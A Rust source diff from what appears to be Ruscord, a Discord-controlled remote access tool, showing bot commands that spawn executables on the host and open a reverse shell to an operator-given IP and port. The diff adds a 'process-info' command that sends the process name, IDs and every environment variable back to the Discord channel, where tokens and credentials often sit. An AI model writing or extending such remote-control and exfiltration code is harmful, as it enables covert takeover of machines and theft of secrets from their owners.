@@ -1,6 +1,11 @@
-use std::net::IpAddr;
+use std::{fmt::Write, net::IpAddr};
 
-use crate::{os::traits::process::ProcessModule, reply, RuscordContext, RuscordError};
+use tracing::debug;
+
+use crate::{
+	constants::MAX_DISCORD_CHARS, os::traits::process::ProcessModule, reply, reply_as_attachment, RuscordContext,
+	RuscordError,
+};
 /// Spawns an executable on the host with optional arguments.
 #[poise::command(prefix_command, slash_command)]
 pub async fn spawn(
@@ -40,5 +45,30 @@ pub async fn shell(
 
 	os_module.reverse_shell(ip, port).await?;
 	reply!(ctx, "Shell successfully opened!");
+	Ok(())
+}
+
+/// Tells information about the current process.
+#[poise::command(prefix_command, slash_command, rename = "process-info")]
+pub async fn process_info(ctx: RuscordContext<'_>) -> Result<(), RuscordError> {
+	let os_module = &ctx.data().os_module;
+	let info = os_module.process_info()?;
+
+	let mut buffer = String::new();
+	writeln!(
+		buffer,
+		"Name: {:?}\nPID: {}\nPPID: {}\n---Environment Variables---\n",
+		info.name, info.pid, info.ppid
+	)?;
+	for env_var in &info.env_variables {
+		writeln!(buffer, "{}: {}", env_var.key, env_var.value)?;
+	}
+	if buffer.len() > MAX_DISCORD_CHARS {
+		debug!("buffer was too large to send: {}", buffer.len());
+		reply_as_attachment!(ctx, buffer, "process_info.txt");
+	} else {
+		reply!(ctx, "{}", buffer);
+	}
+
 	Ok(())
 }
